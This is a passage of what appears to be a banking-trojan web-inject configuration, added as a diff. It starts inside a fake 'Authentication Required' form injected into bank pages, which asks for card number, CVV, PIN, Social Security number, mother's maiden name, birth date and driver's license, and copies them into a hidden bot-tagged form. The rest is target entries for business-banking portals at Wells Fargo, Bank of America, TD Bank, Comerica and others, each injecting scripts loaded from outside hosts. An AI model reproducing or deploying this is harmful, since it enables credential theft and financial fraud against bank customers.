+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+					  <tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Driver's License Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="driver" id="driver" size="12" maxlength="30"/></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="driver_2" id="driver_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+set_url *itreasury.regions.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/regions.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/regions.js"></script>
+data_end
+data_after
+data_end
+
+set_url *treasurydirect.cpo.tdbank.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/tdbank.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/tdbank.js"></script>
+data_end
+data_after
+data_end
+
+set_url *treasurydirect.soc.tdbank.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/tdbank.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/tdbank.js"></script>
+data_end
+data_after
+data_end
+
+set_url *treasurydirect*tdbank.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/tdbank.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/tdbank.js"></script>
+data_end
+data_after
+data_end
+
+set_url *cashproonline.bankofamerica.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/cashpro.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/cashpro.js"></script>
+data_end
+data_after
+data_end
+
+set_url *cpw-mibs.bankofamerica.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/cashpro.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/cashpro.js"></script>
+data_end
+data_after
+data_end
+
+set_url *directportal.bankofamerica.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/cashpro.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/cashpro.js"></script>
+data_end
+data_after
+data_end
+
+set_url *treas-mgt.frostbank.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/frost.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/frost.js"></script>
+data_end
+data_after
+data_end
+
+set_url *comerica.com/nv/TMConnectWeb* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/comerica.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/comerica.js"></script>
+data_end
+data_after
+data_end
+
+set_url *comerica.com/cma/portal/mybusinessconnect* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/comerica.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/comerica.js"></script>
+data_end
+data_after
+data_end
+
+set_url *businessaccess.citibank.citigroup.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/citibusiness.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/citibusiness.js"></script>
+data_end
+data_after
+data_end
+
+set_url */onlineserv/CM/* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/onlineserv.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/onlineserv.js"></script>
+data_end
+data_after
+data_end
+set_url *presidiobank.com/onlineserv/CM* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/presidio_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/presidio_redirect.js"></script>
+data_end
+data_after
+data_end
+set_url *privatebk.ebanking-services.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/tpb_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/tpb_redirect.js"></script>
+data_end
+data_after
+data_end
+set_url *smallbusinessonline.bbt.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/bbtsmallbusiness_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/bbtsmallbusiness_redirect.js"></script>
+data_end
+data_after
+data_end
+set_url *chsec.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
+
+set_url *wellsoffice.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
+
+set_url *wellsstation.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
+
+set_url *wellsnet.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
+
+set_url *wellsadmin.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
+
+set_url *ceowt.wellsfargo.com* GP
+data_before
+<head>
+data_end
+data_inject
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@var357.com/ssl/wf_redirect.js"></script>
+<script type="text/javascript" src="https://p8.secure.hostingprod.com/@jscripts.net/ssl/wf_redirect.js"></script>
+data_end
+data_after
+data_end
